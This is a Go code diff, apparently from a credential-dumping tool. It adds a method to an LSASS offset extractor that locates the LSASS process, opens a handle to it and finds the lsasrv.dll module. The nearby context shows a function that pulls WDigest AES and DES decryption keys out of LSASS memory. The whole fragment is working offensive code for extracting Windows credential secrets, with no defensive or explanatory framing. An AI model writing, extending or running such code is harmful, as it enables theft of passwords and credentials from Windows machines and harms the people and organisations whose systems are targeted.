@@ -395,6 +395,34 @@ func (loe *LsassOffsetExtractor) GetPatternForBuild() *PatternReference {
 	return selectedPattern
 }
 
+// GetLsasrvModuleInfo returns the lsasrv.dll module information
+func (loe *LsassOffsetExtractor) GetLsasrvModuleInfo() (uint64, uint32, error) {
+	// Ensure we have the module info
+	if loe.lsasrvBase == 0 {
+		// Find LSASS PID
+		pid, err := loe.getLsassPID()
+		if err != nil {
+			return 0, 0, fmt.Errorf("failed to get LSASS PID: %v", err)
+		}
+		loe.lsassPID = pid
+		
+		// Open LSASS process handle
+		err = loe.openLsassProcess()
+		if err != nil {
+			return 0, 0, fmt.Errorf("failed to open LSASS process: %v", err)
+		}
+		defer loe.Close()
+		
+		// Find lsasrv.dll module
+		err = loe.findLsasrvModule()
+		if err != nil {
+			return 0, 0, fmt.Errorf("failed to find lsasrv.dll module: %v", err)
+		}
+	}
+	
+	return loe.lsasrvBase, loe.lsasrvSize, nil
+}
+
 // FindWDigestDecryptionKeys extracts AES and DES keys from wdigest.dll in LSASS
 func (loe *LsassOffsetExtractor) FindWDigestDecryptionKeys() (*DecryptionKeys, error) {
 	loe.logger.Info("Searching for WDigest decryption keys in LSASS memory...")
